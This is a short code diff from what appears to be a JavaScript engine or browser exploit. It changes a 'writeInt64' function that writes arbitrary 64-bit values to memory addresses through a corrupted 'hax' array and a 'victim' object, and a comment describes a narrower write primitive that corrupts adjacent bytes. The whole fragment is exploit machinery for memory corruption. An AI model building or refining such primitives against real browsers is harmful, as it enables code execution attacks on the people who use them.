@@ -469,7 +469,7 @@ var print = (msg) => {
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
             hax[1] = Add(new Int64(addr),0x10);
-            victim.pointer = int64;
+            victim.pointer = new Int64(int64);
         },
 
         /*// Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
